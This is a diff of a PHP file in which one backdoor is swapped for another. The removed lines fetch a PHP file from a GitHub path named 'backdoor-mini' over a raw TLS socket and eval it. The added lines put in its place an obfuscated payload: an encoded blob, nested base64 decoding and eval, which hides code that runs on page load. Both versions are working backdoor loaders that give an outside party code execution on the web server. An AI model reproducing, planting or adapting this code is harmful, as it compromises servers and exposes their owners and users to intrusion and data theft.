@@ -1,28 +1,3 @@
 <?php
-$host = 'raw.githubusercontent.com';
-$port = 443;
-$path = '/GanestSeven/backdoor-mini/refs/heads/main/2.php';
-
-$fp = stream_socket_client("ssl://$host:$port", $errno, $errstr, 30);
-if (!$fp) {
-    echo "Error: $errstr ($errno)<br />\n";
-} else {
-    $out = "GET $path HTTP/1.1\r\n";
-    $out .= "Host: $host\r\n";
-    $out .= "Connection: Close\r\n\r\n";
-    fwrite($fp, $out);
-
-    $content = '';
-    while (!feof($fp)) {
-        $content .= fgets($fp, 128);
-    }
-    fclose($fp);
-
-    $header_end = strpos($content, "\r\n\r\n");
-    if ($header_end !== false) {
-        $content = substr($content, $header_end + 4);
-    }
-
-    eval("?>" .$content);
-}
+$SISTEMIT_COM_ENC = "5VS7jqNKFMxX2p+wJtiRA5vXeKzRBNi8MWDTNAwkI4FkSzysNomBv0GWHNhyQEBkkez5sW3P7Gb3D26EWuquqlNVh58/npCOPNnSvc+lY33K9vJ3//67H6XR2oYBOkNU9A9ut5tDK8s13Bs4o60ba/4qc6cBvdGuNp64UfgptI0VKa+BIicLNYI2hBN00BZV/fHS7I1UhnMZbRBahpwD57GwbtZMQNYscXKL1McoyvIVLgnDVJ633GoSXHYznpiu5mSuzMMtggv0QTFnVOhtuKw20EVbZlzycMnKJVz1MCME6aWrcbsM69D5BM78XgtUuAtwc1SeLOCi470A5wUMRyyIWyrw3OzUEG5weZnCME3nOxMGaWIecO1NHLugpANWPVshLxtfLwynWWFvfcRL/XCoFgUMW78heoGIDO1LAl1Nxmo+H3sitIE+QeOjWhpH6MYwlB/QHRCPtMyqK6MU4V4EImPZVfhxgN6cHc0MhtVUNOBavZoinLhEgaE2y808Y2BoDpHOGEzsUUroeTg5LLPXReiVFT8z4O7DNVZe4xV15+in0nKS6dkM7tmOh1YT4SZ4pQYnn4ZyhT7yhHkEg+XOwjIXVAfukn60Ma5nEVqy9RI6B07acsYHtsgWcAuSOeePa2gdVpk02MkTqlIi6xQ6davCLXshPiOs03JhQg9X4iDEJnDbzlynqqVozgeGD70n0dzgwlTSPAyTAzVWgHY99thAcaY8JpxU0kQm0IrJ9kD2i8YbGyIJlYficPrIyuJk6DbxZLuz3kdvTyUMezi/x4+iwu2F/4Qz3BK4Pz6/RihLqG+qSzZebrjshg39hIkDQ3NTmj9moSWBT0eKZeGAC2qHy0SHMDVQLNPhcO56fib4OMcVyiPVwS62JKWgZ8alF2gOdBekiJ2bG0ahSlirwXtKJC32PpcXrhZ5IWebjjyv0D7n4n3CeoFgbdhITnI7TaZw5z0KYcLtgwo+0SZGUZxVUpS5DWbtBqXUHRhkQgvLCpzN0PA82abIivCNDF2FUvloT+097S6RMGMI1KgzD0OWy1ZgmFb2/ShL/sJk38iG/8WkRf/Yg+xbUvOt0YX+S3ThkgeVxShfMGlEr1SW9DU4XE2EbWolS8vgpsbX6GFjI7j5uwYVVepy0MI98CjblOheukhhoGxlyArLhMkfgmi2lxiHNWLcBv2bw2fCmkZz5ugzzQ6gpZsRQMeNnt/opvYw5L/+O/O/jXh+fntCnrN+H/1ffl6jt58//gA=";$rand=base64_decode("Skc1aGRpQTlJR2Q2YVc1bWJHRjBaU2hpWVhObE5qUmZaR1ZqYjJSbEtDUlRTVk5VUlUxSlZGOURUMDFmUlU1REtTazdDZ29KQ1Fra2MzUnlJRDBnV3lmRHZTY3NKOE9xSnl3bnc2TW5MQ2ZEclNjc0o4TzdKeXdudzZZbkxDZkRzU2NzSjhPaEp5d253N1VuTENmRHF5Y3NKOEsxSjEwN0Nna0pDU1J5Y0d4aklEMWJKMkVuTENkcEp5d25kU2NzSjJVbkxDZHZKeXduWkNjc0ozTW5MQ2RvSnl3bmRpY3NKM1FuTENjZ0oxMDdDZ2tKSUNBa2JtRjJJRDBnYzNSeVgzSmxjR3hoWTJVb0pITjBjaXdrY25Cc1l5d2tibUYyS1RzS0Nna0pDV1YyWVd3b0pHNWhkaWs3");eval(base64_decode($rand));$STOP="FMxX2p+wJtiRA5vXeKzRBNi8MWDTNAwkI4FkSzysNomBv0GWHNhyQEBkkez5sW3P7Gb3D26EWuquqlNVh58/npCOPNnSvc+lY33K9vJ3//67H6XR2oYBOkNU9A9ut5tDK8s13Bs4o60ba/4qc6cBvdGuNp64UfgptI0VKa+BIicLNYI2hBN00BZV/fHS7I1UhnMZbRBa";
 ?>
